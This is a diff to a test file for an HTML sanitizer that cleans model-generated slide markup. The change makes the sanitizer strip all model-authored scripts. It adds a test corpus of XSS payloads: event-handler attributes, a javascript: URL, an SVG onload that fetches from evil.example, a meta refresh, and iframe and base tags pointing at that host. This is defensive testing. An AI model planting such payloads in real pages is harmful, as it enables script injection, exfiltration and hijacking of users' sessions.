@@ -81,9 +81,11 @@ describe('designer-prompt — system prompt + user prompt', () => {
     // It is shown to the model as the gold standard — it must not teach bad CSS.
     expect(auditDesignerHtmlTaurus(DESIGNER_EXEMPLAR)).toHaveLength(0);
     expect(() => sanitizeDesignerHtml(DESIGNER_EXEMPLAR)).not.toThrow();
-    // The exemplar must demonstrate the content auto-fit + reserved footer band.
-    expect(DESIGNER_EXEMPLAR).toContain('fitCol');
-    expect(DESIGNER_EXEMPLAR).toContain('document.fonts');
+    // W0-02: the exemplar must NOT teach the model to author scripts — the
+    // platform runtime owns scaling/fitting. The auto-fit contract is the
+    // data-fit-col attribute + the reserved footer band.
+    expect(DESIGNER_EXEMPLAR).not.toContain('<script');
+    expect(DESIGNER_EXEMPLAR).toContain('data-fit-col');
     expect(DESIGNER_EXEMPLAR).toContain('class="foot"');
     // Every font-family it names must be in the loaded set (else it teaches a
     // family the renderer drops to system-ui — the "unstyled" failure).
@@ -98,11 +100,38 @@ describe('designer-prompt — system prompt + user prompt', () => {
 });
 
 describe('sanitizeDesignerHtml', () => {
-  it('keeps a real document + its inline (self-scaling) script', () => {
+  // W0-02 (audit 2026-07-12 P0): model-authored JavaScript must NEVER
+  // survive sanitization — the sandbox does not stop postMessage, outbound
+  // requests, or CPU burn. The platform injects its own trusted runtimes
+  // AFTER this pass.
+  it('strips ALL model-authored inline scripts (keeps the document)', () => {
     const withScript = DOC.replace('</body>', '<script>var s=1;</script></body>');
     const { html } = sanitizeDesignerHtml(withScript);
     expect(html).toContain('<!doctype html>');
-    expect(html).toContain('var s=1'); // inline script kept (sandbox-contained)
+    expect(html).not.toContain('var s=1');
+    expect(html).not.toMatch(/<script/i);
+  });
+
+  it('strips the malicious-payload corpus: on* handlers, javascript: URLs, SVG onload, meta refresh, nested frames', () => {
+    const bad = DOC.replace(
+      '</body>',
+      '<img src="https://ok.example/x.png" onerror="parent.postMessage({type:\'educms-action\'},\'*\')">' +
+      '<a href="javascript:alert(1)">tap</a>' +
+      '<svg onload="fetch(\'https://evil.example\')"><circle r="4"/></svg>' +
+      '<meta http-equiv="refresh" content="0;url=https://evil.example">' +
+      '<div onclick=\'doEvil()\' onmouseover=doEvil2()>x</div>' +
+      '<iframe src="https://evil.example"></iframe>' +
+      '<base href="https://evil.example/">' +
+      '</body>',
+    );
+    const { html } = sanitizeDesignerHtml(bad);
+    expect(html).not.toMatch(/onerror|onclick|onmouseover|onload/i);
+    expect(html).not.toMatch(/javascript:/i);
+    expect(html).not.toMatch(/http-equiv\s*=\s*["']?refresh/i);
+    expect(html).not.toMatch(/<iframe|<base/i);
+    expect(html).not.toMatch(/<script/i);
+    // The benign img + its https src survive.
+    expect(html).toContain('https://ok.example/x.png');
   });
 
   it('strips markdown fences + leading prose before the doctype', () => {
@@ -215,11 +244,12 @@ describe('designer base64 transport (cont.)', () => {
     expect(pipe(b64)).toBe(b64); // no tags → sanitize-html passes it through
     const decoded = Buffer.from(pipe(b64), 'base64').toString('utf8');
     expect(decoded).toBe(DOC);
-    // and the decoded doc still passes the designer sanitizer with style + script intact
+    // and the decoded doc still passes the designer sanitizer with style
+    // intact — while any model script is stripped (W0-02).
     const withScript = decoded.replace('</body>', '<style>.z{color:#0f0}</style><script>var s=1;</script></body>');
     const { html } = sanitizeDesignerHtml(withScript);
     expect(html).toContain('<style>');
-    expect(html).toContain('var s=1');
+    expect(html).not.toContain('var s=1');
   });
 });
 
